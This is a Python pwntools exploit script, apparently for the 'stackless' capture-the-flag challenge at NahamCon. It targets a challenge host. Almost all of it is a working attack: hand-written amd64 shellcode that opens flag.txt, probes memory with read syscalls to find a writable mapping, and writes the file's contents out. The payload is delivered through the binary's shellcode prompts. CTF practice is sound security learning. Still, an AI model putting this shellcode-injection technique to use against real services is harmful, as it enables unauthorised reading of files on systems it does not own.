#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template stackless
from pwn import *

HOST, PORT = "challenge.nahamcon.com 31651".split()
# Set up pwntools for the correct architecture
exe = context.binary = ELF('stackless')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *(main+649)
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

shellcode = asm("""
    lea rdi, [rip+0x200-0xa]
    mov rax, 0x2
    syscall
    mov rdi, rax
    mov rsi, 0x7ff000000000
    find_addr:
    mov rax, 0
    mov rdx, 0x40
    add rsi, 0x10000
    syscall
    cmp rax, 0
    jl find_addr
    mov rdi, 1
    mov rax, 1
    syscall
""")
payload = shellcode
payload = payload.ljust(0x200-0x3, b"\x90")
payload += b"flag.txt"

io = start()
io.sendlineafter(b"Shellcode length\n", str(len(payload)).encode())
io.sendlineafter(b"Shellcode\n", payload)

flag = io.recvline().strip().decode()
log.success(f"got flag: {flag}")
